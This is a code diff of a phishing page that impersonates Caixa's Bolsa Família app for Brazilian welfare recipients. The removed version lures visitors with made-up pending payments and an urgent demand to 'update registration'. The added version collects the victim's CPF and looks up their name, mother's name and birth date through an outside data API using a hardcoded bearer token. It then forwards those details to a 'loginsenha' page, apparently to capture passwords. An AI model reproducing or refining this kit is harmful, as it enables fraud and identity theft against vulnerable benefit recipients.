@@ -1,199 +1,161 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Parcelas Bolsa Família</title>
-  <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aplicativo Bolsa Família</title>
+  <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
-  font-family: 'Rawline', sans-serif;
-  background: #fff;
-  margin: 0;
-  color: #003366;
-}
-    .topo-img {
-      width: 100%;
-      margin-bottom: 5px;
+      font-family: 'Rawline', sans-serif;
+      background: white;
+      color: #00496D;
+      padding: 20px;
+      text-align: center;
+    }
+    .logo {
+      width: 140px;
+      margin: 0 auto;
       display: block;
     }
-    .parcela {
-      margin-bottom: 32px;
-      line-height: 1.8;
+    h2 {
+      font-size: 16px;
+      font-weight: 600;
+      margin: 8px 0 24px;
+      color: #1a73e8;
     }
-    .titulo-secao {
-      font-weight: bold;
-      color: #0b66a7;
-      font-size: 20px;
-      margin-top: 30px;
-      margin-bottom: 12px;
+    .descricao {
+      font-size: 18px;
+      font-weight: 400;
+      margin-bottom: 24px;
+      color: #2b4d50;
+      padding: 0 30px;
     }
-    .linha-parcela {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-    }
-    .icone {
-      width: 30px;
-      margin-top: 6px;
-    }
-    .detalhes {
-      flex: 1;
-    }
-    .mes {
-      font-weight: bold;
-      font-size: 20px;
-      color: #0b66a7;
-    }
-    .programa {
-      font-weight: bold;
-      font-size: 20px;
-      color: #0b66a7;
-    }
-    .valor {
-      float: right;
-      font-weight: bold;
-      font-size: 20px;
-      color: #0b66a7;
-    }
-    .validade {
-      font-size: 14px;
-      color: #444;
-      margin-top: 6px;
-    }
-    .atualizado {
-      text-align: center;
-      font-size: 13px;
-      color: #444;
-      margin-top: 40px;
-      font-family: 'Rawline', sans-serif;
-    }
-    .aviso {
-      background-color: #fff3cd;
-      color: #856404;
-      border: 1px solid #ffeeba;
-      padding: 12px 16px;
-      border-radius: 6px;
+    .input-group {
       display: flex;
       align-items: center;
-      gap: 10px;
-      font-size: 17px;
-      font-weight: 500;
-      margin-bottom: 20px;
-    }
-    .aviso img {
-      width: 40px;
-      height: 40px;
-    }
-    .btn-atualizar {
-      display: block;
-      width: 100%;
+      border-bottom: 2px solid #d6802f;
       max-width: 380px;
-      margin: 0 auto 30px;
-      background-color: #1a73e8;
+      margin: 0 auto 24px;
+      padding: 6px 0;
+    }
+    .input-group img {
+      width: 22px;
+      margin-right: 8px;
+    }
+    input[type="text"] {
+      border: none;
+      outline: none;
+      font-size: 16px;
+      flex: 1;
+      color: #2b4d50;
+      font-family: 'Rawline', sans-serif;
+    }
+    .btn {
+      background-color: #d6802f;
       color: white;
       border: none;
-      font-size: 16px;
-      font-weight: bold;
-      padding: 18px;
+      padding: 12px;
       border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      width: 100%;
+      max-width: 380px;
       cursor: pointer;
-      text-align: center;
+      margin: 0 auto 32px;
+      display: block;
+      font-family: 'Rawline', sans-serif;
     }
-  
-    .conteudo {
-      max-width: 480px;
-      margin: 0 auto;
-      padding: 20px;
+    .ajuda {
+      color: #1a73e8;
+      font-weight: 600;
+      font-size: 15px;
+      text-decoration: underline;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      font-family: 'Rawline', sans-serif;
     }
-    </style>
+    .ajuda img {
+      width: 20px;
+    }
+  </style>
 </head>
 <body>
-  
-  <img src="topo-pagina.webp" alt="Imagem Topo" class="topo-img" />
-<div class="conteudo">
-
-  <div class="aviso">
-    <img src="icone-alerta webp.webp" alt="Alerta" />
-    <span><strong>ATENÇÃO:</strong> PARA LIBERAR AS PARCELAS, VOCÊ PRECISA ATUALIZAR SEU CADASTRO!</span>
+  <img src="caixa logo.webp" alt="Logo Caixa" class="logo">
+  <h2>Aplicativo Bolsa Família</h2>
+  <p class="descricao">
+    Informe seu CPF e clique em "Próximo" para continuar:
+  </p>
+  <div id="erroCPF" style="display:none;background:#ffe5e5;color:#cc0000;font-weight:600;padding:12px;margin:0 auto 16px;max-width:380px;border-radius:6px;">CPF Inválido</div>
+  <div class="input-group">
+    <img src="icone-user webp.webp" alt="CPF">
+    <input type="text" id="cpfInput" placeholder="CPF" maxlength="14" oninput="formatarInputCPF(this)">
   </div>
+  <button class="btn" onclick="consultarCPF()">Próximo</button>
+  <a href="#" class="ajuda">
+    <img src="icone-ajuda webp.webp" alt="Ajuda">
+    Preciso de ajuda
+  </a>
 
-  <button class="btn-atualizar" onclick="window.location.href='atualizar.html'">ATUALIZAR CADASTRO</button>
 
-  <div class="titulo-secao">PARCELAS A SEREM LIBERADAS</div>
-  <div id="parcelas-liberadas"></div>
 
-  <div class="titulo-secao">DEMAIS PARCELAS</div>
-  <div id="demais-parcelas"></div>
+<script>
+function getQueryParam(param) {
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  } catch (e) {
+    console.error("Erro ao ler parâmetro da URL:", e);
+    return null;
+  }
+}
 
-  <div class="atualizado" id="atualizado"></div>
+async function consultarCPF() {
+  const erroEl = document.getElementById('erroCPF');
+  erroEl.style.display = 'none';
 
-  <script>
-    const meses = ["JANEIRO", "FEVEREIRO", "MARÇO", "ABRIL", "MAIO", "JUNHO", "JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"];
-    const hoje = new Date();
-    const anoAtual = hoje.getFullYear();
-    const mesAtualIndex = hoje.getMonth();
+  const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
+  if (!cpf || cpf.length < 11) {
+    erroEl.style.display = 'block';
+    return;
+  }
 
-    const dataFormatada = hoje.toLocaleDateString('pt-BR');
-
-    const validadeFutura = new Date(hoje.getTime() + 32 * 24 * 60 * 60 * 1000);
-    const diaFinal = Math.floor(Math.random() * 6) + 20;
-    const validadeFinal = new Date(anoAtual, validadeFutura.getMonth() + 4, diaFinal).toLocaleDateString('pt-BR');
-
-    const parcelasLiberadas = [
-      {
-        mes: `${meses[mesAtualIndex]} DE ${anoAtual}`,
-        valor: 'R$ 1.298,00',
-        programa: 'PROG BOLSA FAMILIA',
-        validade: dataFormatada,
-        icone: 'icone-alerta webp.webp'
-      },
-      {
-        mes: `${meses[(mesAtualIndex + 1) % 12]} DE ${anoAtual}`,
-        valor: 'R$ 1.298,00',
-        programa: 'PROG BOLSA FAMILIA',
-        validade: `${validadeFutura.toLocaleDateString('pt-BR')} à ${validadeFinal}`,
-        icone: 'icone-alerta webp.webp'
+  try {
+    const response = await fetch(`https://datagetapi.online/api/v1/cpf/${cpf}`, {
+      method: 'GET',
+      headers: {
+        'Authorization': 'Bearer fed55ffa1d483c9d8770ed3e2187823fa268d5f70b27fb66badb3284eca6d5db'
       }
-    ];
+    });
 
-    const demaisParcelas = [];
-    for (let i = mesAtualIndex + 2; i <= 11; i++) {
-      const diaInicio = Math.floor(Math.random() * 7) + 20;
-      const diaFim = Math.floor(Math.random() * 7) + 20;
-      const dataInicio = new Date(anoAtual, i, diaInicio);
-      const dataFim = new Date(anoAtual, i + 4, diaFim);
-      demaisParcelas.push({
-        mes: `${meses[i]} DE ${anoAtual}`,
-        valor: 'R$ 600,00',
-        programa: 'PROG BOLSA FAMILIA',
-        validade: `${dataInicio.toLocaleDateString('pt-BR')} à ${dataFim.toLocaleDateString('pt-BR')}`,
-        icone: 'icone-alerta webp.webp'
-      });
+    if (response.ok) {
+      const data = await response.json();
+      console.log('Dados do CPF:', data);
+      window.location.href = `loginsenha?cpf=${cpf}&nome=${encodeURIComponent(data.NOME || '')}&mae=${encodeURIComponent(data.NOME_MAE || '')}&nasc=${encodeURIComponent(data.NASC || '')}`;
+    } else {
+      erroEl.style.display = 'block';
     }
+  } catch (error) {
+    erroEl.style.display = 'block';
+    console.error(error);
+  }
+}
 
-    function criarParcela(parcela, tipo) {
-      let html = `
-        <div class="parcela">
-          <div class="linha-parcela">
-            <img class="icone" src="${parcela.icone}" alt="icone" />
-            <div class="detalhes">
-              <div class="mes">${parcela.mes}${parcela.valor ? `<span class="valor">${parcela.valor}</span>` : ''}</div>
-              ${parcela.programa ? `<div class="programa">${parcela.programa}</div>` : ''}
-              ${parcela.validade ? `<div class="validade">Validade: ${parcela.validade}</div>` : ''}
-            </div>
-          </div>
-        </div>`;
-      return html;
-    }
+function formatarInputCPF(input) {
+  let value = input.value.replace(/\D/g, "").slice(0, 11);
+  value = value.replace(/(\d{3})(\d)/, "$1.$2");
+  value = value.replace(/(\d{3})(\d)/, "$1.$2");
+  value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+  input.value = value;
+}
 
-    document.getElementById('parcelas-liberadas').innerHTML = parcelasLiberadas.map(p => criarParcela(p, 'liberada')).join('');
-    document.getElementById('demais-parcelas').innerHTML = demaisParcelas.map(p => criarParcela(p, 'demais')).join('');
-
-    const agora = new Date();
-    const formatado = agora.toLocaleDateString('pt-BR') + ' às ' + agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-    document.getElementById('atualizado').textContent = `Dados atualizados em: ${formatado}`;
-  </script>
-</div>
+</script>
 </body>
-</html>
